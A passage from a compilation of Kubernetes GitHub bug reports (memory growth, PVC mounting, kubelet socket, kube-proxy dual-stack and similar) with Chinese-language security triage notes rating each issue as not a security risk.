	  an appropriate Ginkgo node (e.g. a BeforeSuite, BeforeEach, It, etc...).
	
	  �[1mLearn more at:�[0m

```

inside a `wait.Poll` like loop we execute a function that return a bool and an error.

If we want to fail fast we return the error directly and assert on the output of the wait function.
If we want to retry we log the error and return false nil

/kind flake
/kind bug
/sig testing
/sig network

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue讨论的是在Kubernetes的E2E测试代码中，在`wait.Poll`循环内执行断言时出现的问题。具体来说，当在`wait.Poll`循环内调用断言会导致Ginkgo的panic无法被正常捕获。这是一个测试代码中的问题，涉及测试框架的使用方式，并不涉及任何安全风险。根据风险判断标准，该问题不属于安全风险，不会被攻击者利用，也不会导致任何安全漏洞。

---

## Issue #126918 APIServerTracing causing huge memory consumption/memory leak

- Issue 链接：[#126918](https://github.com/kubernetes/kubernetes/issues/126918)

### Issue 内容

#### What happened?

Since updating from Kubernetes 1.26.* to 1.29.* we experiences OOM-Kills on control plane nodes.
After some investigation we found that adding `--feature-gates=APIServerTracing=false` to the `kube-apiserver` fixed the issue.
(Found this via pprof/heap of one apiserver: heap dump could be added if needed)

Before the update to 1.29.* the control planes were running with 4GB of memory with the same worklow in the cluster without issues. After the workarround using the feature gate the memory consumption of the whole control plane is not at ~2GB.

#### What did you expect to happen?

In case there is an issue with other components, memory consumption of the apiserver should not be that excessive.

#### How can we reproduce it (as minimally and precisely as possible)?

We just had the K8s cluster running and saw a permant increase in memory usage of the control plane nodes. And after some time (can not give a specific duration) the OS of the control plane node started to OOM kill processes.

#### Anything else we need to know?

Let us know if you need additional information.


#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.4
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.4
```

</details>


#### Cloud provider

on-premise; control-planes are running with 4 CPU cores, 8GB of memory and and NVME discs

#### OS version

<details>

```console
$ cat /etc/os-release 
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

$ uname -a
Linux kube-master01-003 5.10.0-32-cloud-amd64 #1 SMP Debian 5.10.223-1 (2024-08-10) x86_64 GNU/Linux

```

</details>


#### Install tools

<details>

```console
$ kubeadm version -o yaml
clientVersion:
  buildDate: "2024-04-16T15:05:51Z"
  compiler: gc
  gitCommit: 55019c83b0fd51ef4ced8c29eec2c4847f896e74
  gitTreeState: clean
  gitVersion: v1.29.4
  goVersion: go1.21.9
  major: "1"
  minor: "29"
  platform: linux/amd64
```

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

```console
$ crictl version
Version:  0.1.0
RuntimeName:  containerd
RuntimeVersion:  1.6.31
RuntimeApiVersion:  v1
```

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue报告了在升级Kubernetes版本至1.29.*后，启用`APIServerTracing`功能导致`kube-apiserver`内存消耗巨大，最终引发控制平面节点的OOM-Kill问题。通过禁用`APIServerTracing`功能，内存消耗恢复正常。

根据风险判断标准：

1. **该风险能被攻击者利用**：Issue中没有提及攻击者可以利用该问题。
2. **风险评级**：没有证据表明该问题会导致高危漏洞，也没有被分配CVE编号的可能性。
4. **拒绝服务攻击**：虽然存在内存消耗过高的问题，但Issue中没有说明攻击者可以通过特定操作触发内存泄漏导致DoS攻击。
6. **不涉及安全问题**：该Issue是关于系统性能和资源消耗的Bug，不涉及安全风险。

综上所述，该问题属于性能问题，不涉及安全风险。

---

## Issue #127004 Cannot mount the same PVC multiple times on one Pod

- Issue 链接：[#127004](https://github.com/kubernetes/kubernetes/issues/127004)

### Issue 内容

#### What happened?

When I mount the same PVC multiple times on one Pod, the Pod is stuck in `containerCreating` state.

Same issue described here: https://stackoverflow.com/questions/65931457/why-cant-i-mount-the-same-pvc-twice-with-different-subpaths-to-single-pod

#### What did you expect to happen?

The mount of volumes should succeed, and the Pod should be created successfully.

Or, if Kubernetes treats this as a mis-configuration, a clear error message should be returned.

#### How can we reproduce it (as minimally and precisely as possible)?

I am testing on a GKE cluster. The same PVC is used by one Pod twice.

```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: my-claim
spec:
  accessModes:
    - ReadWriteOnce  
  resources:
    requests:
      storage: 1Gi  
  storageClassName: standard  
---
apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  containers:
  - name: my-container
    image: nginx  
    volumeMounts:
    - name: my-pvc
      mountPath: /data/path1
    - name: my-pvc-2
      mountPath: /data/path2
  volumes:
  - name: my-pvc
    persistentVolumeClaim:
      claimName: my-claim  
  - name: my-pvc-2
    persistentVolumeClaim:
      claimName: my-claim  
```

#### Anything else we need to know?

We have another similar issue documented: https://github.com/GoogleCloudPlatform/gcs-fuse-csi-driver/issues/48

According to the kubelet code: https://github.com/kubernetes/kubernetes/blob/8f15859afc9cfaeb05d4915ffa204d84da512094/pkg/kubelet/volumemanager/cache/desired_state_of_world.go#L296-L298

> For non-attachable and non-device-mountable volumes, generate a unique name based on the pod namespace and name and the name of the volume within the pod.

Since the user has two same PVCs specified on the Pod spec, the tow PVCs must bound to the same PV, meaning the `volumeHandle` is the same for the two volumes. Therefore, different volumes will be treated as the same volume. After kubelet mounts one of the volumes, the other volume will be treated as already mounted. As a result, the Pod will be stuck in volume mount stage.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.7
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.6-gke.1326000
```

Note that this issue is not limited to any specific k8s verisons.

</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue描述了在同一个Pod中多次挂载同一个PVC会导致Pod卡在`containerCreating`状态的问题。这是由于Kubernetes对同一PVC在同一Pod中的多次挂载存在限制，导致Pod无法正常创建。

根据风险判断标准：

- **第3条**：Issue提交者在提交内容中暴露的配置问题，不属于安全风险，这是配置使用不当导致的问题。
- **第6条**：如果Issue不涉及安全问题，则风险评级判断为不涉及。

综上所述，该Issue不涉及安全风险。

---

## Issue #126972 Watches are not drained during graceful termination when feature gate APIServingWithRoutine is on

- Issue 链接：[#126972](https://github.com/kubernetes/kubernetes/issues/126972)

### Issue 内容

#### What happened?

I tried to observe the graceful termination of kube-apiserver, in particular, how watches are drained.
1) I created a cluster in 1.30 with kube-apiserver flags
```
--shutdown-delay-duration=10s --shutdown-send-retry-after=true --shutdown-watch-termination-grace-period=60s 
```
and with feature gate `APIServingWithRoutine` on.
Also, I added to kube-apiserver's manifest the following line
```
"terminationGracePeriodSeconds"=60,
```
2) I killed the kube-apiserver, and found the following log during graceful termination:
```
"[graceful-termination] active watch request(s) have drained" duration="1m0s" activeWatchesBefore=0 activeWatchesAfter=0 error=null
```
`activeWatchesBefore=0` is not the expected behavior.
Also, I do not observe any logs of watches being closed.

#### What did you expect to happen?

I expected a non-zero number of watches to be drained during graceful termination.
When I do the same procedure as above but for cluster 1.29.6 (or a cluster with feature gate `APIServingWithRoutine` off) I see a log similar to this one
```
"[graceful-termination] active watch request(s) have drained" duration="1m0s" activeWatchesBefore=623 activeWatchesAfter=0 error=null"
```
and, preceding it, there are logs of watches being closed (with latency in ~minutes)

#### How can we reproduce it (as minimally and precisely as possible)?

Create clusters in 1.30 with provided kube-apiserver flags and with feature gate `APIServingWithRoutine` on and off, respectively.

#### Anything else we need to know?

This issue seems to be related to:
- https://github.com/kubernetes/kubernetes/issues/125614

In particular, disabling the feature gate `APIServingWithRoutine` on the kube-apiserver leads to the correct behavior (watches are being drained as in 1.29 version)

#### Kubernetes version

Observed in 1.30.2+

#### Cloud provider

N/A


#### OS version

N/A

#### Install tools

N/A

#### Container runtime (CRI) and version (if applicable)

N/A


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

N/A

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在启用特性门`APIServingWithRoutine`的情况下，kube-apiserver在优雅关闭期间没有正确地清理watch连接，`activeWatchesBefore=0`，这与预期不符。然而，这属于功能性缺陷或Bug，不涉及安全风险。没有证据表明攻击者可以利用此问题实施攻击，也不会导致权限提升、拒绝服务等安全问题。根据风险判断标准第6条，此Issue不涉及安全问题。

---

## Issue #126965 kubelet fail to start on Windows since v1.31.0

- Issue 链接：[#126965](https://github.com/kubernetes/kubernetes/issues/126965)

### Issue 内容

#### What happened?

Since I upgraded my kubernetes cluster from `v1.30.4` to `v1.31.0`, kubelet fails to restart on Windows.

The error messages in the logs are:
```
E0828 03:15:28.934935    5404 server.go:102] "Failed to listen to socket while starting device plugin registry" err="listen unix C:\\var\\lib\\kubelet\\device-plugins\\kubelet.sock: bind: Only one usage of each socket address (protocol/network address/port) is normally permitted."
E0828 03:15:28.934935    5404 kubelet.go:1566] "Failed to start ContainerManager" err="listen unix C:\\var\\lib\\kubelet\\device-plugins\\kubelet.sock: bind: Only one usage of each socket address (protocol/network address/port) is normally permitted."
```

#### What did you expect to happen?

I expected kubelet to start even if the `kubelet.sock` file exists, this was the behavior in the previous versions.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Setup a Windows Kubernetes Node
2. Start kubelet.exe
3. Stop kubelet.exe
4. Start kubelet.exe again and watch it fail due to the kubelet.sock file already existing.

#### Anything else we need to know?

I think this Issue has to do with the commit 4060ee6 where socket files are not removed anymore causing the start to fail because the file already exists.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>

#### Cloud provider

On Premise / No Cloud Provider

#### OS version

<details>

```console
C:\> wmic os get Caption,Version,BuildNumber,OSArchitecture
BuildNumber  Caption                                              OSArchitecture  Version
20348        Microsoft Windows Server 2022 Datacenter Evaluation  64-bit          10.0.20348
```

</details>

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

<details>

Containerd Version: 1.7.20

</details>

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在Windows系统上运行kubelet时，如果`kubelet.sock`文件已存在，导致kubelet无法启动的问题。这是由于kubelet在启动时尝试绑定到已存在的socket文件，因而发生了错误。这属于软件的功能性缺陷，导致了服务不可用。但要利用该缺陷，攻击者需要具备在系统中创建或删除`C:\var\lib\kubelet\device-plugins\kubelet.sock`文件的权限，这通常需要管理员或高权限用户才能做到。普通非特权用户无法在该目录下创建文件。因此，攻击者无法利用该问题进行攻击，且该问题不涉及敏感信息泄露、权限提升、远程代码执行等安全风险。根据风险判断标准，第4条指出，当攻击者需要创建、修改等非只读权限时，不应判断为高风险。因此，该Issue不涉及安全风险。

---

## Issue #126960 kube-proxy hope listen all zero addresses in dual-stack env without health check error

- Issue 链接：[#126960](https://github.com/kubernetes/kubernetes/issues/126960)

### Issue 内容

#### What happened?

I have deployed a latest 1.31 Kubernetes dual-stack cluster, and cube-proxy is running in IPVS mode
Also created a dual-stack service with `externalTrafficPolicy: Local`:
```
  ...
  externalTrafficPolicy: Local
  healthCheckNodePort: 30256
  internalTrafficPolicy: Cluster
  ipFamilies:
    - IPv4
    - IPv6
  ipFamilyPolicy: PreferDualStack
  ...
```
In kube-proxy’s configuration, —nodeport-addresses is unset. (we know this strongly is recommended in 1.31, but we don’t expect to just listen on certain specific ip, just want to listen on all interface)

And the error in kube-proxy's log:
```
 "Opening healthcheck" service="default/service-1" port=30256
 "Opening healthcheck" service="default/service-1" port=30256
 "Failed to start healthcheck" err="listen tcp 0.0.0.0:30256: bind: address already in use" node="xxxxxxx" service="default/service-1" port=30256
```

And the cause of this problem is the way how kube-proxy handles health check nodePortAddresses in dual-stack.

There are some previous discussions about this issue:
https://github.com/kubernetes/kubernetes/issues/114702
https://github.com/kubernetes/kubernetes/issues/122899
But still can't solve our problem or meet our needs.

#### What did you expect to happen?

In [#123105](https://github.com/kubernetes/kubernetes/pull/123105), setting `—nodeport-addresses` to the value `"primary"`, which means only listening for NodePort connections on the node's primary IPv4 and/or IPv6 address, may solve the address problem. 

But in some scenarios (some users do have this kind of needs), we still hope to listen on all interfaces, and this is the current default behavior in IPVS mode, and when you create a dual-service, there is always the problem mentioned above.

It’s a quite long-standing question for kube-proxy, but still unsolved, since ipv6 "::" also includes ipv4 on Linux https://github.com/kubernetes/kubernetes/issues/122899, and then the “address already bind” error seems to be inevitable, and in this situation, `—nodeport-addresses` is still helpless.

One possible solution I could figure out is:
When a dual-satck service change comes, if nodePortAddress have all zero addresses in IPv6 ip family, only open the healthcheck in IPv6's proxier.

But this may require a large change to the code: the IPv4 proxier also need to watch the change in IPv6, and pass relative parameters to its healthcheck server.

#### How can we reproduce it (as minimally and precisely as possible)?

In a dual-stack cluster environment, `--nodeport-addresses` is not configured.
Additionally, a dual-stack LoadBalancer Service with healthCheckNodePort is created.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# 1.31.0
```

</details>


#### Cloud provider

<details>
nil
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
通过对Issue内容的分析，这是一个关于kube-proxy在双栈（IPv4和IPv6）环境下监听所有接口时出现健康检查错误的问题。具体而言，当未设置`--nodeport-addresses`参数且创建了具有`externalTrafficPolicy: Local`的双栈服务时，kube-proxy会由于地址冲突而无法启动健康检查服务（出现"address already in use"错误）。这一问题导致健康检查无法正常工作，可能影响服务的可用性。

根据提供的风险判断标准：

1. **该风险能被攻击者利用**：该问题主要是配置和实现上的问题，没有提及攻击者可以利用该问题进行攻击的途径。

2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：此问题未涉及到权限提升、未授权访问、命令执行等高风险安全问题，更多是功能性错误。

4. **在风险为拒绝服务（DoS）攻击时，如果攻击者需要一定权限才能够实施该攻击，则视情况需要降级处理**：该问题并非由攻击者引发的拒绝服务，而是配置导致的服务不可用。

综上所述，该Issue中没有涉及到安全风险。

---

## Issue #126958 failed to sync secret/configmap cache: timed out waiting for the condition when WatchList feature is enable

- Issue 链接：[#126958](https://github.com/kubernetes/kubernetes/issues/126958)

### Issue 内容

#### What happened?

In k8s 1.29 cluster, kubelet will report warning event about `failed to sync secret/configmap cache: timed out waiting for the condition` sometimes when create a pod. It was caused by following code:
https://github.com/kubernetes/kubernetes/blob/f1a922c8e6f951381450ee3c2922ca018f14a82e/pkg/kubelet/util/manager/watch_based_manager.go#L322

As the above code shows, secret/configmap cache should be synced during 1 second, but it may can't. When WatchList feature is enable, reflector need to receive a special bookmark to know whether the cache is synced. But in kube-apiserver:
https://github.com/kubernetes/kubernetes/blob/f1a922c8e6f951381450ee3c2922ca018f14a82e/staging/src/k8s.io/apiserver/pkg/storage/cacher/cacher.go#L1024

bookmark tick period is `1s to 1.25s`, so cache in reflect may can not be synced during `1s`.

Solutions to fix this issue:
1.   Shorten the bookmark tick time or Extended cache synced timeout
2.  Modify how bookmarks are sent in the WatchList feature, like https://github.com/Chaunceyctx/kubernetes/commit/3525f29bd383de59df69dff018641b18f382cdfd

After sending all items in watchCache store, we are able to send bookmark to client right now because store in watchCache is fresh enough which is guaranteed by:
https://github.com/kubernetes/kubernetes/blob/8486ed06200f019c65777e6b028f7a17299a8f85/staging/src/k8s.io/apiserver/pkg/storage/cacher/cacher.go#L1417

fix before:
```
I0828 10:50:16.052616 3101121 reflector.go:790] exiting secret3782178982722928679 Watch because received the bookmark that marks the end of initial events st ream, total 1 items received in 741.998362ms
I0828 10:50:34.191047 3101121 reflector.go:790] exiting secret5351765028251036481 Watch because received the bookmark that marks the end of initial events st ream, total 1 items received in 866.105471ms
I0828 10:50:45.713883 3101121 reflector.go:790] exiting secret8541420941097821224 Watch because received the bookmark that marks the end of initial events stream, total 1 items received in 380.334209ms
```

fix after:
```
I0828 10:55:27.530189 3107457 reflector.go:790] exiting secret778191698868956976 Watch because received the bookmark that marks the end of initial events str eam, total 1 items received in 13.256389ms
I0828 10:55:33.530398 3107457 reflector.go:790] exiting secret8547880469315277671 Watch because received the bookmark that marks the end of initial events st ream, total 1 items received in 8.192703ms
I0828 10:55:39.534974 3107457 reflector.go:790] exiting secret2690312991024336831 Watch because received the bookmark that marks the end of initial events st ream, total 1 items received in 8.180822ms
```
I prefer the latter. What's about experts' opinions? @wojtek-t @p0lyn0mial @liggitt 

#### What did you expect to happen?

secret/configmap cache becomes synced successfully duration 1s

#### How can we reproduce it (as minimally and precisely as possible)?

1. enable watchlist feature in client
2. change klog level to 4
3. create a reflector to watchlist some resources like pods/secrets
4. you will get a log message ` "exiting %v Watch because received the bookmark that marks the end of initial events stream, total %v items received in %v" ` see time cost

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了在 Kubernetes 1.29 集群中，当启用 WatchList 功能并创建 Pod 时，kubelet 有时会报告警告事件：`failed to sync secret/configmap cache: timed out waiting for the condition`。这是由于在启用 WatchList 功能后，reflector 需要接收到一个特殊的 bookmark 才能确认缓存已同步。但 kube-apiserver 发送 bookmark 的间隔时间在 1 秒到 1.25 秒之间，导致 reflector 可能无法在预期的 1 秒内完成同步。

这个问题的影响是可能导致同步延迟和警告日志产生，但并未对系统的安全性造成影响。没有证据表明攻击者可以利用此问题进行攻击，也不存在信息泄露、权限提升或拒绝服务等安全风险。

根据风险判断标准：
1. 该风险能被攻击者利用：不存在攻击者可利用的风险。
2. 该风险有可能成为一个漏洞，并被分配 CVE 编号，使用 CVSS 3.1 评分标准打分，结果要在 high 以上：不符合。
6. 如果 Issue 不涉及安全问题，则风险评级判断为不涉及。

因此，该 Issue 不涉及安全风险。

---

## Issue #126951 `"failed to initialize nfacct client" err="nfacct sub-system not available"` logged when `k8s.io/kubernetes/pkg/proxy/metrics` module is initialized as non-root user

- Issue 链接：[#126951](https://github.com/kubernetes/kubernetes/issues/126951)

### Issue 内容

#### What happened?

The `k8s.io/kubernetes/pkg/proxy/metrics` module now logs two errors during module initialization. Simply loading the module will cause two errors to be printed to stderr if the code is not run as root, or is run on a node without nfacct support. 

This is due to `newNFAcctMetricCollector` being used when creating Prometheus metrics during module variable initialization, which calls `klog.Errors()` if the nfacct client cannot be initialized.

This regression was introduced by:
* https://github.com/kubernetes/kubernetes/pull/125866

K3s ships all the various Kubernetes components bundled in a single multicall binary, which means that our `kubectl` now logs these errors when it is run as a non-root user.

#### What did you expect to happen?

No error logs on module init

#### How can we reproduce it (as minimally and precisely as possible)?

https://github.com/brandond/kube-proxy-repro

```golang
import (
	"k8s.io/kubernetes/cmd/kube-proxy/app"
)

func main() {
	_ = app.NewProxyCommand()
}
```

#### Anything else we need to know?

cc @aroradaman @danwinship

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0+k3s1
Kustomize Version: v5.4.2
Server Version: v1.31.0+k3s1
```

</details>


#### Cloud provider

n/a

#### OS version

n/a


#### Install tools

n/a

#### Container runtime (CRI) and version (if applicable)

n/a


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

n/a

area/proxy
sig/network

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据Issue的描述，`kube-proxy`的metrics模块在非root用户运行时会记录两个错误日志。这是由于在模块变量初始化时，如果nfacct客户端无法初始化，调用了`klog.Errors()`导致的。这种行为属于日志记录的问题，可能会引起一些困扰或不必要的日志输出，但并不涉及安全风险。

按照风险判断标准：
1. 该风险无法被攻击者利用，不会导致攻击者获取敏感信息或提升权限。
2. 该问题不可能成为一个漏洞，也不会被分配CVE编号，CVSS评分也不会达到high以上。
6. 因此，该Issue不涉及安全问题，风险评级判断为不涉及。

---

## Issue #126947 Change kube-controller-manager flags documentation related to --service-account-private-key-file, remove outdated warnings during initialization & update documentation

- Issue 链接：[#126947](https://github.com/kubernetes/kubernetes/issues/126947)

### Issue 内容

#### What happened?

The kube-controller-manager issues a warning during startup when `--use-service-account-credentials` is specified without providing a `--service-account-private-key-file`. This warning is misleading because the legacy service account token controller, which relies on the `--service-account-private-key-file`, is no longer required for most modern Kubernetes clusters unless explicitly needed for generating long-lived tokens. Additionally, the documentation does not clearly state the purpose of this flag or its impact on legacy token mechanisms.

#### What did you expect to happen?

I expected that the warning related to the `--service-account-private-key-file` would either not appear or be updated to reflect its relevance only to the legacy token mechanism. Furthermore, I expected the documentation to clearly explain that this flag is only necessary for enabling the legacy service account token controller and to provide updated guidance on generating long-lived tokens.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Start kube-controller-manager with the --use-service-account-credentials flag but without the --service-account-private-key-file flag.
2. Observe the warning message that is issued during initialization.
3. Review the current documentation for kube-controller-manager flags and the process for generating long-lived service account tokens.

#### Anything else we need to know?

[Slack Thread](https://kubernetes.slack.com/archives/C0EN96KUY/p1724435410277869) for context

#### Kubernetes version

<details>

```console
Client Version: v1.32.0-alpha.0.170+cb7b4ea648a97b-dirty
Kustomize Version: v5.4.2
Server Version: v1.32.0-alpha.0.22+09f025973a0c61

```

</details>


#### Cloud provider

<details>
Bare metal
</details>


#### OS version

<details>

```console
$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

$ uname -a
Linux bastion 6.1.0-23-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue提出了`kube-controller-manager`在使用`--use-service-account-credentials`参数而未提供`--service-account-private-key-file`时会产生误导性的警告信息。这个警告与遗留的服务账户令牌控制器有关，但在现代的Kubernetes集群中，该控制器通常不再需要，除非需要生成长期有效的令牌。

此问题主要涉及日志警告信息和文档的更新，以消除不必要的警告并澄清参数的用途。根据提供的内容，没有涉及任何可被攻击者利用的安全漏洞或配置错误。

根据风险判断标准：
1. **该风险能被攻击者利用**：不存在可被利用的风险。
2. **风险评级在high以上**：不适用。
6. **如果Issue不涉及安全问题，则风险评级判断为不涉及**。

综上所述，此Issue不涉及安全风险。

---

## Issue #126943 Extended resources could not be zeroed while node has been recreated

- Issue 链接：[#126943](https://github.com/kubernetes/kubernetes/issues/126943)

### Issue 内容

#### What happened?

https://github.com/kubernetes/kubernetes/blob/7436ca32bc766ff202109a7541d2e7bb41ee7d13/pkg/kubelet/kubelet_node_status.go#L181

the `reconcileExtendedResource` check with devicemanager to see if there is no checkpoints to  decide whether to zero out ER, but while kubelet start, the checkpoint dir could not be empty as the kubelet.sock will be created first

https://github.com/kubernetes/kubernetes/blob/7436ca32bc766ff202109a7541d2e7bb41ee7d13/pkg/kubelet/checkpointmanager/checkpoint_manager.go#L105

the `ListCheckpoints ` list all file except ones which has prefix ".",  but not filter the sock files, so `kl.containerManager.ShouldResetExtendedResourceCapacity`  will always return false


#### What did you expect to happen?

the `ListCheckpoints ` should only list the real checkpoint file,  the kubelet_internal_checkpoint

#### How can we reproduce it (as minimally and precisely as possible)?

1. register a node with GPU 
2. recreate the node with a new vm
3. see the node status GPU resource,  not zerod out

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.28.x
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在节点重建后，拓展资源（如GPU）未被归零的问题。原因是在判断是否需要归零拓展资源时，`ListCheckpoints`函数会列出除了以`.`开头的文件之外的所有文件，但未过滤掉`sock`文件，导致`kl.containerManager.ShouldResetExtendedResourceCapacity`始终返回`false`，从而未能正确归零资源。这会导致调度器将需要GPU资源的Pod调度到实际上不具备GPU的节点上，造成资源调度错误。然而，这属于功能性缺陷，影响系统的可用性，但并不涉及安全风险。根据风险判断标准，第6条，如果Issue不涉及安全问题，则风险评级判断为不涉及。

---

